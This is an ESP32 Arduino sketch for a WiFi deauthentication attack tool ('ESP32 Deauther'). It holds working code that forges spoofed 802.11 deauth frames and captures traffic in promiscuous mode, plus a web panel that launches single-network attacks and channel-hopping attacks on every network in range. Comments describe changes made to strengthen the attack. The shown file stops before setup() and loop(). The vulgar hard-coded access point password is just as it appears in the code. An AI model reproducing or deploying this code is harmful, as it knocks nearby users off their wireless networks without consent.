// This is a manually combined version of the .ino file and its header files.
// This version includes previous fixes and the updated web interface design,
// and FIXES the issue where HTML string concatenation syntax was visible on the web page.
//
// This is generally NOT the recommended way to structure an Arduino project
// with multiple files. The standard practice is to keep headers (.h) separate
// from the main sketch (.ino) and implementation files (.cpp) and use #include
// directives.
//
// Use this file with caution. It is likely less maintainable and readable
// than the original multi-file structure.

#include <Arduino.h> // Included for Arduino functions like Serial, pinMode, digitalWrite, delay
#include <WiFi.h>
#include <esp_wifi.h>
#include <WebServer.h> // Included for the web server functionality

// --- Content from definitions.h ---
// #ifndef DEFINITIONS_H // Include guards removed
// #define DEFINITIONS_H

#define AP_SSID "don't mind me"
#define AP_PASS "@suckmydickplease"
#define LED 2 // Define LED pin if used
#define SERIAL_DEBUG // Define to enable Serial debug prints
#define CHANNEL_MAX 13 // Max WiFi channel (usually 13 or 14 depending on region)
#define NUM_FRAMES_PER_DEAUTH 64 // --- MODIFIED: Increased frames per burst (was 16) ---
#define DEAUTH_BLINK_TIMES 2 // How many times to blink the LED per deauth burst
#define DEAUTH_BLINK_DURATION 20 // Duration of each LED blink in milliseconds
#define DEAUTH_ATTACK_INTERVAL_MS 50 // --- MODIFIED: Decreased interval between bursts (was 100) ---

// Define attack types
#define DEAUTH_TYPE_SINGLE 0 // Attack a specific network
#define DEAUTH_TYPE_ALL 1 // Attack all networks by channel hopping

// Conditional debugging macros
#ifdef SERIAL_DEBUG
#define DEBUG_PRINT(...) Serial.print(__VA_ARGS__)
#define DEBUG_PRINTLN(...) Serial.println(__VA_ARGS__)
#define DEBUG_PRINTF(...) Serial.printf(__VA_ARGS__)
#endif
#ifndef SERIAL_DEBUG
#define DEBUG_PRINT(...)
#define DEBUG_PRINTLN(...)
#define DEBUG_PRINTF(...)
#endif

// Conditional LED blinking macro
#ifdef LED
#define BLINK_LED(num_times, blink_duration) blink_led(num_times, blink_duration) // Calls the actual function
#endif
#ifndef LED
#define BLINK_LED(num_times, blink_duration) // Empty macro if LED is not defined
#endif

// Function declaration for blink_led (implementation is below in the main code)
void blink_led(int num_times, int blink_duration);

// #endif // DEFINITIONS_H // Include guard removed
// --- End of definitions.h content ---


// --- Content from types.h ---
// #ifndef TYPES_H // Include guards removed
// #define TYPES_H

// Structure for a basic Deauthentication frame
typedef struct {
  uint8_t frame_control[2] = { 0xC0, 0x00 }; // Type/Subtype: Management (0), Deauthentication (1100)
  uint8_t duration[2]; // Duration/ID field
  uint8_t station[6]; // Destination MAC address (STA to deauth, use FF:FF:FF:FF:FF:FF for broadcast)
  uint8_t sender[6]; // Source MAC address (usually BSSID of AP - spoofed)
  uint8_t access_point[6]; // BSSID (MAC of the AP - spoofed)
  uint8_t fragment_sequence[2] = { 0xF0, 0xFF }; // Sequence/Fragment number
  uint16_t reason; // Reason code for deauthentication
} deauth_frame_t;

// Basic MAC header structure (simplified for sniffing relevant fields)
typedef struct {
  uint16_t frame_ctrl; // Frame Control field
  uint16_t duration;
  uint8_t dest[6]; // Destination address (DA)
  uint8_t src[6]; // Source address (SA)
  uint8_t bssid[6]; // BSSID address
  uint16_t sequence_ctrl; // Sequence Control field
  // Note: This struct might need addr4[6] depending on frame type (e.g., WDS)
  // For simplicity in sniffing, we might only need up to bssid.
  // The original code had addr4, keeping it for compatibility with the sniffer usage:
  uint8_t addr4[6]; // Address 4 (if present, e.g., in WDS)
} mac_hdr_t;

// Structure representing a full Wi-Fi packet header + payload
typedef struct {
  mac_hdr_t hdr; // The MAC header
  uint8_t payload[0]; // Placeholder for the payload (variable length)
} wifi_packet_t;

// Filter configuration for promiscuous mode
const wifi_promiscuous_filter_t filt = {
  .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA // Capture management and data frames
};

// #endif // TYPES_H // Include guard removed
// --- End of types.h content ---


// --- Content from deauth.h ---
// #ifndef DEAUTH_H // Include guards removed
// #define DEAUTH_H

// #include <Arduino.h> // Already included at the top

// Function declarations for deauth control (implementations are below)
void start_deauth(int wifi_number, int attack_type, uint16_t reason);
void stop_deauth();

// External declarations for global variables defined in the main .ino file
// These tell the compiler that these variables exist elsewhere.
extern int eliminated_stations;
extern int deauth_type;

// #endif // DEAUTH_H // Include guard removed
// --- End of deauth.h content ---


// --- Content from web_interface.h ---
// #ifndef WEB_INTERFACE_H // Include guards removed
// #define WEB_INTERFACE_H

// Function declarations for web interface handling (implementations are below)
void start_web_interface();
void web_interface_handle_client();

// #endif // WEB_INTERFACE_H // Include guard removed
// --- End of web_interface.h content ---


// --- Global variables from the original .ino snippet ---
// These are the *definitions* of the variables declared as 'extern' in headers
deauth_frame_t deauth_frame; // Requires definition of deauth_frame_t (now included from types.h content)
int deauth_type = DEAUTH_TYPE_SINGLE; // Requires definition of DEAUTH_TYPE_SINGLE (now included from definitions.h content)
int eliminated_stations = 0; // Initialize counter (might not be accurate in broadcast mode)
int curr_channel = 1; // Current channel for DEAUTH_TYPE_ALL

// Web server instance
WebServer server(80);
int num_networks = 0; // Global variable to store the number of scanned networks

// Note: The 'filt' variable is defined in the types.h content block above.
// --- End of global variables ---


// Helper function to get human-readable encryption type string
String getEncryptionType(wifi_auth_mode_t encryptionType) {
  switch (encryptionType) {
    case WIFI_AUTH_OPEN:
      return "Open";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA_WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2_ENTERPRISE";
     // --- REMOVED FOR COMPATIBILITY WITH OLDER LIBRARIES ---
     // case WIFI_AUTH_WPA3_PSK:
     //  return "WPA3_PSK";
     // case WIFI_AUTH_WPA2_WPA3_PSK:
     //  return "WPA2_WPA3_PSK";
     // --- END REMOVED ---
    case WIFI_AUTH_MAX: // This is usually the last enum value, representing the count
      return "Unknown"; // Or handle as needed
    default:
      return "UNKNOWN"; // Will now show UNKNOWN for WPA3 types if not defined
  }
}

// External C function declaration for promiscuous mode sanity check bypass
// The definition might be provided elsewhere by the SDK or handled by linker script.
// Removed explicit definition from here to avoid multiple definition errors.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3);


// Declaration for esp_wifi_80211_tx (usually declared in esp_wifi.h, but good to have if not)
// esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
// Note: This declaration might be redundant if already in esp_wifi.h, but including it here doesn't hurt.

// Function to blink an LED, conditionally compiled based on the LED macro
#ifdef LED
void blink_led(int num_times, int blink_duration) {
  // pinMode(LED, OUTPUT) is handled in setup()
  for (int i = 0; i < num_times; i++) {
    digitalWrite(LED, HIGH);
    delay(blink_duration / 2);
    digitalWrite(LED, LOW);
    delay(blink_duration / 2);
  }
}
#endif

// The sniffer function definition - handles received Wi-Fi packets in promiscuous mode
// IRAM_ATTR attribute places the function in IRAM for faster execution
IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  // Cast payload to wifi_packet_t structure (requires definition of wifi_packet_t)
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  // Get the MAC header part (requires definition of mac_hdr_t)
  const mac_hdr_t *mac_header = &packet->hdr;

  const int16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);
  if (packet_length < 0) return;

  // --- MODIFIED SNIFFER LOGIC FOR SINGLE TARGET ---
  // Sniffer still needed to keep promiscuous mode alive on the target channel
  // but deauth sending for single target is moved to loop().
  // For DEAUTH_TYPE_ALL, sniffer still handles reactive sending.
  if (deauth_type == DEAUTH_TYPE_ALL) {
    // For deauthing all stations (channel hopping), react to client packets
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      memcpy(deauth_frame.station, mac_header->src, 6); // Station is the packet source
      memcpy(deauth_frame.access_point, mac_header->dest, 6); // AP is the packet destination
      memcpy(deauth_frame.sender, mac_header->dest, 6); // Sender is the AP (faking from AP)
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
       DEBUG_PRINTF("Send %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X (DEAUTH_ALL)\n", NUM_FRAMES_PER_DEAUTH, mac_header->src[0], mac_header->src[1], mac_header->src[2], mac_header->src[3], mac_header->src[4], mac_header->src[5]);
      BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
    } else return; // Ignore non-client packets in DEAUTH_TYPE_ALL mode
  }
  // --- END MODIFIED SNIFFER ---

  // Note: Eliminated stations counter is less meaningful in broadcast attacks.
  // You could add logic here to count *unique* client MACs seen if needed,
  // but the simple counter used before is not accurate for broadcast.
  // eliminated_stations++; // Keep this if you want to count packets triggering the sniffer in ALL mode
}

// The start_deauth function definition - configures Wi-Fi and starts the attack
void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  // eliminated_stations = 0; // Resetting counter might not be useful for broadcast
  deauth_type = attack_type; // Set the attack type

  // Set common deauth frame fields
  deauth_frame.reason = reason; // Set the reason code
  deauth_frame.frame_control[0] = 0xC0; // Type: Management (00), Subtype: Deauthentication (1100)
  deauth_frame.frame_control[1] = 0x00; // Protocol version (00)

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    // Single target deauth (stronger: target broadcast)
    DEBUG_PRINT("Starting Deauth-Attack on network: ");
    DEBUG_PRINTLN(WiFi.SSID(wifi_number));

    // Set up a fake AP with the target network's details for sending deauths
    // This allows sending deauth frames from the target's BSSID
    WiFi.softAP(AP_SSID, AP_PASS); // AP_SSID/PASS from definitions.h
    esp_wifi_set_channel(WiFi.channel(wifi_number), WIFI_SECOND_CHAN_NONE); // Set channel to target's channel

    // Set BSSID and Sender MAC in the deauth frame to the target AP's BSSID
    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6); // AP MAC is target BSSID
    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6); // Sender is target BSSID (faking)

    // --- MODIFIED FOR STRONGER SINGLE TARGET ---
    // Target the broadcast address FF:FF:FF:FF:FF:FF instead of waiting for client MACs
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(deauth_frame.station, broadcast_mac, 6); // Deauth destination is broadcast
    // --- END MODIFIED ---

  } else { // Assuming DEAUTH_TYPE_ALL (channel hopping broadcast attack)
    // Deauth all stations - disables the fake AP and switches to STA mode for channel hopping
    DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
    WiFi.softAPdisconnect(); // Disconnect from the fake AP
    WiFi.mode(WIFI_MODE_STA); // Switch to STA mode for channel hopping
    // In DEAUTH_TYPE_ALL, the sniffer will populate deauth_frame fields reactively per packet.
  }

  // Enable promiscuous mode and set up the sniffer callback
  // Promiscuous mode allows the ESP32 to receive all packets, not just those addressed to it.
  esp_wifi_set_promiscuous(true);
  // Set the filter to only capture Management and Data frames (defined in types.h)
  esp_wifi_set_promiscuous_filter(&filt);
  // Register the sniffer function to be called for each received packet matching the filter
  esp_wifi_set_promiscuous_rx_cb(&sniffer);

  // Note: When attack_type is DEAUTH_TYPE_ALL, the loop() function handles channel switching.
  // When attack_type is DEAUTH_TYPE_SINGLE, the loop() will now handle periodic broadcast deauth sending.
}

// The stop_deauth function definition - stops the attack and disables promiscuous mode
void stop_deauth() {
  DEBUG_PRINTLN("Stopping Deauth-Attack..");
  esp_wifi_set_promiscuous(false); // Disable promiscuous mode
  esp_wifi_set_promiscuous_rx_cb(NULL); // Deregister the sniffer callback
  WiFi.mode(WIFI_MODE_AP); // Return to AP mode (or desired default)
  WiFi.softAP(AP_SSID, AP_PASS); // Restart the access point for the web interface
  deauth_type = -1; // Reset deauth type to indicate no attack is running
  curr_channel = 1; // Reset channel counter
  num_networks = 0; // Reset network scan count (optional, can rescan on root)
  eliminated_stations = 0; // Reset counter
}


// Helper function to redirect to the root page
void redirect_root() {
  server.sendHeader("Location", "/");
  server.send(303); // Use 303 See Other for POST redirects, or 302 Found
}


// Web server request handler for root ("/")
void handle_root() {
  // --- FIX START: Removed automatic scan on page load ---
  // New behavior: Page loads without scanning. Scan happens only on /rescan POST.
  // num_networks is initialized to 0 globally, so the table will be empty until rescan.
  // --- FIX END ---

  // Ensure deauth_type is correctly reflected on page load if an attack was stopped
  if (deauth_type != DEAUTH_TYPE_SINGLE && deauth_type != DEAUTH_TYPE_ALL) {
       deauth_type = -1;
  }


  // --- UPDATED WEB INTERFACE DESIGN (HTML/CSS) ---
  // --- FIX START: Corrected HTML string concatenation for dynamic content ---
  String html = R"html(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESP32 Deauther</title>
    <style>
        /* --- General Styling --- */
        body {
            font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif; /* Modern font stack */
            line-height: 1.6;
            color: #e0e0e0; /* Light grey text on dark background */
            max-width: 800px;
            margin: 20px auto;
            padding: 0 15px; /* Adjusted padding */
            background: linear-gradient(135deg, #222 0%, #333 60%, #444 100%); /* Smoother dark gradient */
            min-height: 100vh;
            box-sizing: border-box;
        }

        *, *:before, *:after {
            box-sizing: inherit;
        }

        h1, h2 {
            color: #ff8a65; /* Soft orange/red */
            text-align: center;
            margin-bottom: 20px;
            margin-top: 25px; /* Adjusted spacing */
            font-weight: 600; /* Slightly bolder headers */
        }
         h1 { margin-top: 0; font-size: 2.2em; }
         h2 { font-size: 1.6em; border-bottom: 2px solid rgba(255,138,101,0.3); padding-bottom: 5px; }


        /* --- Container Styling --- */
        .container {
            background-color: rgba(255, 255, 255, 0.08); /* Semi-transparent white */
            backdrop-filter: blur(5px); /* Optional: Frosted glass effect */
            border: 1px solid rgba(255, 255, 255, 0.1); /* Subtle border */
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3); /* Subtler shadow */
            margin-bottom: 25px;
            color: #eee; /* Light text inside container */
            overflow: hidden;
        }


        /* --- Table Styling --- */
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
            table-layout: auto;
            font-size: 0.9em; /* Slightly smaller font for table */
        }

        th, td {
            padding: 10px; /* Slightly less padding */
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1); /* Lighter, semi-transparent border */
            word-break: break-word;
        }

        th {
            background-color: rgba(255,138,101,0.1); /* Light orange/red background */
            color: #ff8a65; /* Match header color */
            font-weight: 600;
        }

        tr:nth-child(even) {
            background-color: rgba(255, 255, 255, 0.03); /* Very subtle stripe */
        }

        tr:hover {
            background-color: rgba(255, 255, 255, 0.05); /* Subtle hover effect */
        }

        .table-container {
            overflow-x: auto;
        }


        /* --- Form Styling --- */
        form {
           /* styles are now handled by the .container class */
           margin-bottom: 0;
        }

        input[type="text"], input[type="number"] {
            display: block;
            width: 100%;
            padding: 10px; /* Adjusted padding */
            margin-bottom: 15px;
            border: 1px solid rgba(255, 255, 255, 0.2); /* Subtle border */
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 1rem;
            background-color: rgba(0, 0, 0, 0.2); /* Dark input background */
            color: #eee; /* Light input text */
            transition: border-color 0.3s ease;
        }
         input[type="text"]:focus, input[type="number"]:focus {
            outline: none;
            border-color: #ff8a65; /* Highlight on focus */
        }

        input[type="number"]::-webkit-outer-spin-button,
        input[type="number"]::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
         input[type="number"] { -moz-appearance: textfield; }


        /* --- Button Styling --- */
        input[type="submit"] {
            display: block;
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1.1rem;
            font-weight: bold;
            text-align: center;
            transition: background-color 0.3s ease, opacity 0.3s ease;
            background: linear-gradient(90deg, #ff8a65 0%, #ff5722 100%); /* Orange/Red gradient */
            color: white;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2); /* Subtle shadow */
        }

        input[type="submit"]:hover {
             opacity: 0.9; /* Subtle hover effect */
             background: linear-gradient(90deg, #ff5722 0%, #ff8a65 100%); /* Reverse gradient on hover */
        }

        /* Specific styles for the stop button */
        form[action="/stop"] input[type="submit"] {
             background: linear-gradient(90deg, #757575 0%, #424242 100%); /* Grey gradient */
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
             margin-top: 10px;
        }
        form[action="/stop"] input[type="submit"]:hover {
             background: linear-gradient(90deg, #424242 0%, #757575 100%); /* Reverse gradient on hover */
        }


        /* --- Alert/Message Styling --- */
        .alert {
            background-color: rgba(76, 175, 80, 0.9); /* Green with transparency */
            color: white;
            padding: 15px;
            border-radius: 4px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
            text-align: center;
            margin-bottom: 20px;
            font-weight: bold;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .alert.error {
            background-color: rgba(244, 67, 54, 0.9); /* Red with transparency */
        }
         .alert.warning {
            background-color: rgba(255, 152, 0, 0.9); /* Orange with transparency */
        }
         .alert h2 {
            color: white;
            text-shadow: none;
            margin-top: 0;
            margin-bottom: 10px;
            border-bottom: none; /* No border in alert header */
             padding-bottom: 0;
            font-size: 1.4em; /* Slightly smaller header in alert */
        }
         .alert p {
            margin-bottom: 0;
            font-size: 1em;
            opacity: 0.9;
        }

        .button { /* Reusing .button for links */
            display: inline-block;
            padding: 10px 20px;
            margin-top: 20px;
            background: linear-gradient(90deg, #2196F3 0%, #1976D2 100%); /* Blue gradient */
            color: white;
            text-decoration: none;
            border-radius: 5px;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
            font-size: 1em;
        }

        .button:hover {
            background: linear-gradient(90deg, #1976D2 0%, #2196F3 100%);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }


        /* --- Reason Codes Table Styling --- */
        .reason-codes-table {
            margin-top: 25px; /* Adjusted spacing */
        }
        .reason-codes-table th {
            background-color: rgba(0,0,0,0.2); /* Darker header background */
            color: #bbb; /* Lighter grey text */
        }
        .reason-codes-table tr:nth-child(even) {
             background-color: rgba(0,0,0,0.1); /* Darker subtle stripe */
        }
        .reason-codes-table tr:hover {
            background-color: rgba(0,0,0,0.15); /* Darker hover effect */
        }
        .reason-codes-table td:first-child {
            font-weight: bold;
            color: #ffab91; /* Highlight code number */
        }


        /* --- Responsive Adjustments --- */
        @media (max-width: 600px) {
            body { padding: 0 10px; }
            .container { padding: 15px; }
             th, td { padding: 8px; }
             input[type="text"], input[type="number"], input[type="submit"], .button {
                padding: 10px;
                margin-bottom: 10px;
            }
             h1 { font-size: 1.8em; }
             h2 { font-size: 1.4em; }
        }
    </style>
</head>
<body>
    <h1>ESP32 Deauther</h1>

    <h2>WiFi Networks</h2>
    <div class="container">
        <div class="table-container">
            <table>
                <tr>
                    <th>#</th>
                    <th>SSID</th>
                    <th>BSSID</th>
                    <th>Chan</th>
                    <th>RSSI</th>
                    <th>Encrypt</th>
                </tr>
)html";
  // --- END UPDATED WEB INTERFACE DESIGN ---

  // Loop through scanned networks and add them to the table
  for (int i = 0; i < num_networks; i++) { // --- FIX: Corrected loop condition (was i << 6) ---
    String encryption = getEncryptionType(WiFi.encryptionType(i));
    html += "<tr><td>" + String(i) + "</td><td>" + WiFi.SSID(i) + "</td><td>" + WiFi.BSSIDstr(i) + "</td><td>" +
            String(WiFi.channel(i)) + "</td><td>" + String(WiFi.RSSI(i)) + "</td><td>" + encryption + "</td></tr>";
  }

  // --- FIX START: Corrected HTML string concatenation for dynamic content ---
  html += R"html(
            </table>
        </div>
    </div>

    <div class="container">
        <form method="post" action="/rescan">
            <input type="submit" value="Rescan Networks">
        </form>
    </div>

    <div class="container">
        <h2>Launch Deauth Attack (Single Target)</h2>
        <form method="post" action="/deauth">
            <input type="number" name="net_num" placeholder="Network Number (e.g., 0)" required min="0")html";
            // Conditionally add the max attribute
            if (num_networks > 0) {
               html += " max=\"" + String(num_networks - 1) + "\"";
            }
            html += R"html(>
            <input type="number" name="reason" placeholder="Reason code (e.g., 1)" value="1" required min="0" max="24">
            <input type="submit" value="Launch Single Attack">
        </form>
         <p>Eliminated stations (count may be inaccurate in broadcast mode): )html" + String(eliminated_stations) + R"html(</p>
    </div>

    <div class="container">
        <h2>Launch Deauth Attack (All Stations/Channel Hopping)</h2>
        <form method="post" action="/deauth_all">
            <input type="number" name="reason" placeholder="Reason code (e.g., 1)" value="1" required min="0" max="24">
            <input type="submit" value="Deauth All">
        </form>
         <p>Note: This disables the web interface until 'Stop' is pressed or device is reset.</p>
    </div>


    <div class="container">
        <form method="post" action="/stop">
            <input type="submit" value="Stop Deauth Attack">
        </form>
    </div>


    <div class="container reason-codes-table">
        <h2>Reason Codes</h2>
            <table>
                <tr>
                    <th>Code</th>
                    <th>Meaning</th>
                </tr>
                <tr><td>0</td><td>Reserved.</td></tr>
                <tr><td>1</td><td>Unspecified reason.</td></tr>
                <tr><td>2</td><td>Previous authentication no longer valid.</td></tr>
                <tr><td>3</td><td>Deauthenticated because sending station (STA) is leaving or has left Independent Basic Service Set (IBSS) or ESS.</td></tr>
                <tr><td>4</td><td>Disassociated due to inactivity.</td></tr>
                <tr><td>5</td><td>Disassociated because WAP device is unable to handle all currently associated STAs.</td></tr>
                <tr><td>6</td><td>Class 2 frame received from nonauthenticated STA.</td></tr>
                <tr><td>7</td><td>Class 3 frame received from nonassociated STA.</td></tr>
                <tr><td>8</td><td>Disassociated because sending STA is leaving or has left Basic Service Set (BSS).</td></tr>
                <tr><td>9</td><td>STA requesting (re)association is not authenticated with responding STA.</td></tr>
                <tr><td>10</td><td>Disassociated because the information in the Power Capability element is unacceptable.</td></tr>
                <tr><td>11</td><td>Disassociated because the information in the Supported Channels element is unacceptable.</td></tr>
                <tr><td>12</td><td>Disassociated due to BSS Transition Management.</td></tr>
                <tr><td>13</td><td>Invalid element, that is, an element defined in this standard for which the content does not meet the specifications in Clause 8.</td></tr>
                <tr><td>14</td><td>Message integrity code (MIC) failure.</td></tr>
                <tr><td>15</td><td>4-Way Handshake timeout.</td></tr>
                <tr><td>16</td><td>Group Key Handshake timeout.</td></tr>
                <tr><td>17</td><td>Element in 4-Way Handshake different from (Re)Association Request/ Probe Response/Beacon frame.</td></tr>
                <tr><td>18</td><td>Invalid group cipher.</td></tr>
                <tr><td>19</td><td>Invalid pairwise cipher.</td></tr>
                <tr><td>20</td><td>Invalid AKMP.</td></tr>
                <tr><td>21</td><td>Unsupported RSNE version.</td></tr>
                <tr><td>22</td><td>Invalid RSNE capabilities.</td></tr>
                <tr><td>23</td><td>IEEE 802.1X authentication failed.</td></tr>
                <tr><td>24</td><td>Cipher suite rejected because of the security policy.</td></tr>
            </table>
    </div>

</body>
</html>
)html";
  // --- FIX END: Corrected HTML string concatenation ---

  server.send(200, "text/html", html);
}

// Web server request handler for /deauth (POST)
void handle_deauth() {
  // Get network number and reason code from the request arguments
  int wifi_number = server.arg("net_num").toInt();
  uint16_t reason = server.arg("reason").toInt();

  // --- UPDATED WEB INTERFACE DESIGN (HTML/CSS for status pages) ---
  // --- FIX START: Corrected HTML string concatenation for dynamic content ---
  String html = R"html(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deauth Attack Status</title>
     <style>
        /* Reusing styles from root for consistency */
        body {
            font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #222 0%, #333 60%, #444 100%);
            color: #eee; /* Light default text */
        }
        .alert {
            background-color: rgba(76, 175, 80, 0.9); /* Green with transparency */
            color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.4); /* Subtler shadow */
            text-align: center;
            max-width: 400px;
            width: 90%;
             border: 1px solid rgba(255, 255, 255, 0.15); /* Subtle border */
        }
        .alert.error {
            background-color: rgba(244, 67, 54, 0.9); /* Red with transparency */
        }
         .alert.warning {
            background-color: rgba(255, 152, 0, 0.9); /* Orange with transparency */
        }
         .alert h2 {
            color: white;
            text-shadow: none;
            margin-top: 0;
            margin-bottom: 10px;
             border-bottom: none;
             padding-bottom: 0;
             font-size: 1.6em; /* Match main h2 size */
        }
        .alert p {
            margin-bottom: 0;
            font-size: 1.1em;
            opacity: 0.9;
        }
        .button {
            display: inline-block;
            padding: 10px 20px;
            margin-top: 30px;
            background: linear-gradient(90deg, #2196F3 0%, #1976D2 100%); /* Blue gradient */
            color: white;
            text-decoration: none;
            border-radius: 5px;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
            font-size: 1em;
        }
        .button:hover {
            background: linear-gradient(90deg, #1976D2 0%, #2196F3 100%);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }
    </style>
</head>
<body>
    <div class="alert)html";
  // --- END UPDATED WEB INTERFACE DESIGN ---

  // Basic validation: Check if the network number is within the range of scanned networks
  if (wifi_number >= 0 && num_networks > 0 && wifi_number < num_networks) {
    html += R"html( ">
        <h2>Starting Deauth Attack!</h2>
        <p>Deauthenticating network number: )html" + String(wifi_number) + R"html(</p>
        <p>Reason code: )html" + String(reason) + R"html(</p>
        <a href="/" class="button">Back to Home</a>
    </div>)html";
    // Call the start_deauth function with parameters
    start_deauth(wifi_number, DEAUTH_TYPE_SINGLE, reason);
  } else {
    // --- UPDATED ERROR STRING/MESSAGE ---
    String errorMessage = "Invalid Network Number. ";
    if (num_networks <= 0) {
        errorMessage += "No networks scanned yet. Please go back and Rescan.";
    } else {
        errorMessage += "Number " + String(wifi_number) + " is out of range (0 to " + String(num_networks - 1) + ").";
    }
    html += R"html( error">
        <h2>Error</h2>
        <p>)" + errorMessage + R"html(</p>
        <a href="/" class="button">Back to Home</a>
    </div>)html";
     // --- END UPDATED ERROR STRING/MESSAGE ---
  }

  html += R"html(
</body>
</html>
)html";
  // --- FIX END: Corrected HTML string concatenation ---

  server.send(200, "text/html", html);
}

// Web server request handler for /deauth_all (POST)
void handle_deauth_all() {
  // Get reason code from the request argument
  uint16_t reason = server.arg("reason").toInt();

    // --- UPDATED WEB INTERFACE DESIGN (HTML/CSS for status pages) ---
    // --- FIX START: Corrected HTML string concatenation for dynamic content ---
  String html = R"html(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deauth All Networks Status</title>
    <style>
        /* Reusing styles from root for consistency */
        body {
            font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #222 0%, #333 60%, #444 100%);
            color: #eee; /* Light default text */
        }
        .alert {
            background-color: rgba(255, 152, 0, 0.9); /* Orange with transparency */
            color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.4);
            text-align: center;
            max-width: 450px;
            width: 90%;
             border: 1px solid rgba(255, 255, 255, 0.15);
        }
         .alert h2 {
            color: white;
            text-shadow: none;
            margin-top: 0;
             margin-bottom: 15px;
             border-bottom: none;
             padding-bottom: 0;
             font-size: 1.6em;
        }
         .alert p {
            margin-bottom: 0;
            font-size: 1.1em;
            opacity: 0.9;
        }
         .button { /* Added button style for consistency if needed, though none used on this page */
            display: inline-block;
            padding: 10px 20px;
            margin-top: 30px;
            background: linear-gradient(90deg, #2196F3 0%, #1976D2 100%); /* Blue gradient */
            color: white;
            text-decoration: none;
            border-radius: 5px;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
            font-size: 1em;
        }
        .button:hover {
            background: linear-gradient(90deg, #1976D2 0%, #2196F3 100%);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }
    </style>
</head>
<body>
    <div class="alert warning">
        <h2>Starting Deauth Attack on All Networks!</h2>
        <p>WiFi will now cycle through channels sending deauth frames.</p>
        <p>The web interface will be unavailable during this attack unless 'Stop' is pressed or device is reset.</p>
        <p>Reason code: )html" + String(reason) + R"html(</p>
    </div>
</body>
</html>
)html";
    // --- FIX END: Corrected HTML string concatenation ---

  server.send(200, "text/html", html);
  // Call the start_deauth function for all networks attack
  // The '0' for wifi_number is arbitrary here as attack_type is DEAUTH_TYPE_ALL
  start_deauth(0, DEAUTH_TYPE_ALL, reason);
}

// Web server request handler for /rescan (POST)
void handle_rescan() {
  // Perform a new WiFi scan and update the global count
  WiFi.mode(WIFI_STA); // Ensure in STA mode for scanning
  WiFi.disconnect(); // Disconnect if connected
  delay(100); // Small delay
  DEBUG_PRINTLN("Scanning networks...");
  num_networks = WiFi.scanNetworks();
  DEBUG_PRINTF("Found %d networks\n", num_networks);
  WiFi.mode(WIFI_MODE_AP); // Return to AP mode after scan
  WiFi.softAP(AP_SSID, AP_PASS); // Restart AP for web interface
  redirect_root(); // Redirect back to the home page to display updated list
}

// Web server request handler for /stop (POST)
void handle_stop() {
  // Stop the deauth attack
  stop_deauth();
  redirect_root(); // Redirect back to the home page
}


